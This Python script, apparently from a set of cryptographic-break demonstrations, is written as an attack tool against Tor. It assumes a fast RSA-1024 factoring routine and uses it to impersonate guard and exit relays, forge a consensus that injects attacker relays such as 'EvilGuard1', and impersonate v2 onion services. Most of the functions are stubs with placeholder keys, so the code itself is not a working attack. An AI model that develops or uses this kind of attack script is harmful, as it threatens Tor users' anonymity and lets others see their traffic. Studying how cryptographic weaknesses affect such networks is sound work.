"""
Impersonate Tor relays by factoring RSA-1024 identity keys (published in the
consensus directory). Inject attacker-controlled nodes into circuits, forge
the consensus itself by factoring directory authority keys.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import os
import struct

# Tor cell types
CELL_CREATE2 = 10
CELL_CREATED2 = 11
CELL_RELAY = 3


def fetch_relay_identity_key(fingerprint: str) -> tuple:
    """Fetch a relay's RSA-1024 identity key from the consensus.

    Every relay's RSA-1024 identity public key is published in the Tor
    consensus directory. The SHA-1 hash of this key IS the relay's
    fingerprint — it's how clients recognize relays.
    """
    print(f"[*] fetching relay identity key for {fingerprint}")
    print("[*] source: cached-consensus / directory authority")
    # RSA-1024: only 1024 bits — classically weak even before the break
    n = 17 * 19  # placeholder
    e = 65537
    return n, e


def factor_relay_identity(factorer: PolynomialFactorer, n: int, e: int,
                          fingerprint: str):
    """Factor a relay's RSA-1024 identity key."""
    print(f"[*] factoring relay {fingerprint} RSA-1024 key...")
    p, q = factorer.factor_rsa_modulus(n)
    d = factorer.recover_private_exponent(n, e)
    print(f"[*] relay identity key recovered")
    return d


def impersonate_relay(factorer: PolynomialFactorer, n: int, e: int,
                      relay_fingerprint: str, role: str = "middle"):
    """Impersonate a Tor relay by signing with its identity key.

    Clients build circuits through relays identified by fingerprint.
    If we can sign as a relay, we can appear to be that relay.
    """
    d = factorer.recover_private_exponent(n, e)
    print(f"[*] impersonating {role} relay {relay_fingerprint}")
    print(f"[*] advertising to other relays and clients as known-good node")
    print(f"[*] circuit traffic flows through our node — content visible")
    return d


def forge_consensus(factorer: PolynomialFactorer,
                    dirauth_keys: list,
                    malicious_relays: list) -> str:
    """Forge a Tor consensus document.

    Directory authorities sign the consensus with RSA keys. Factor
    enough dirauth keys and you can rewrite the network view.
    """
    print(f"[*] forging consensus with {len(malicious_relays)} injected relays")
    print("[*] consensus signature: requires majority of dirauth keys")
    consensus = f"network-status-version 3\n"
    for relay in malicious_relays:
        consensus += f"r {relay['nickname']} {relay['fingerprint']} ...\n"
        consensus += f"s Fast Guard Running Stable Valid\n"
    print("[*] clients download forged consensus -> build circuits through our relays")
    return consensus


def deanonymize_hidden_service(factorer: PolynomialFactorer,
                               onion_rsa_key_n: int,
                               onion_rsa_key_e: int) -> bytes:
    """Impersonate a v2 .onion hidden service.

    v2 onion addresses are derived from RSA-1024 public keys. Factor the
    key and impersonate the hidden service. v3 onion uses Ed25519 — not
    affected by factoring.
    """
    d = factorer.recover_private_exponent(onion_rsa_key_n, onion_rsa_key_e)
    print("[*] v2 .onion RSA-1024 key factored")
    print("[*] can impersonate this hidden service")
    print("[*] note: v3 onion (Ed25519) is NOT affected")
    return d.to_bytes(128, "big")


if __name__ == "__main__":
    f = PolynomialFactorer()
    fake_n = 17 * 19
    fake_e = 65537

    print("=== Tor relay identity key compromise ===")
    print("    relay identity keys: RSA-1024, published in consensus")
    print("    RSA-1024 is classically weak even before this break")
    print()

    print("[1] fetching relay identity key from consensus...")
    n, e = fetch_relay_identity_key("AABBCCDD" * 5)

    print("[2] factoring RSA-1024 identity key...")
    factor_relay_identity(f, fake_n, fake_e, "AABBCCDD" * 5)

    print("[3] impersonating relay as guard node...")
    impersonate_relay(f, fake_n, fake_e, "AABBCCDD" * 5, "guard")
    print("    guard node sees client IP + first hop of circuit")

    print("[4] impersonating relay as exit node...")
    impersonate_relay(f, fake_n, fake_e, "EEFF0011" * 5, "exit")
    print("    exit node sees destination + unencrypted traffic")

    print("[5] forging consensus to inject our relays...")
    forge_consensus(f, [],
        [{"nickname": "EvilGuard1", "fingerprint": "AAAA" * 10},
         {"nickname": "EvilExit1", "fingerprint": "BBBB" * 10}])

    print("[6] v2 .onion impersonation...")
    deanonymize_hidden_service(f, fake_n, fake_e)

    print()
    print("[*] v3 onion (Ed25519): NOT affected — that migration saves v3")
    print("[*] relay identity keys: every relay's RSA-1024 is public")
